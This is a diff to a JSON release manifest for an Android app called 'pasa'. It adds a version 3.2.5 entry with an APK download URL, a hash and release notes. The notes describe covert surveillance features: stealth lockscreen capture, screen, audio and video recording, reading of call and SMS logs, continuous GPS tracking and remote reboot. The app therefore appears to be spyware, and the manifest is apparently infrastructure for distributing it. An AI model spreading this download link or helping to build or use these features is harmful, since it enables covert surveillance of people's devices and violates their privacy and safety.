@@ -1,5 +1,16 @@
 [
   {
+    "versionCode": 30,
+    "versionName": "3.2.5",
+    "releaseDate": "2026-09-21",
+    "fileName": "pasa-v3.2.5-30.apk",
+    "downloadUrl": "https://pasa.izhaanintellect.fun/releases/pasa-v3.2.5-30.apk",
+    "sha256": "2a0378420ed8ae4f9efb8176160cfdb68903094313103a7550d633f1c86ac6e4",
+    "size": 19051817,
+    "mandatory": false,
+    "releaseNotes": "v3.2.5: Remote Reboot & Surveillance Stability Suite: Added remote hardware reboot (/reboot) via Enterprise Device Owner; Extended execution timeouts for video, screen recording, and audio up to 120-360s; Enhanced Android 14-16 lockscreen stealth capture wake flags; Search filters for /call_log and /sms_log; Continuous GPS tracking immediate fix."
+  },
+  {
     "versionCode": 26,
     "versionName": "3.2.1",
     "releaseDate": "2026-09-21",
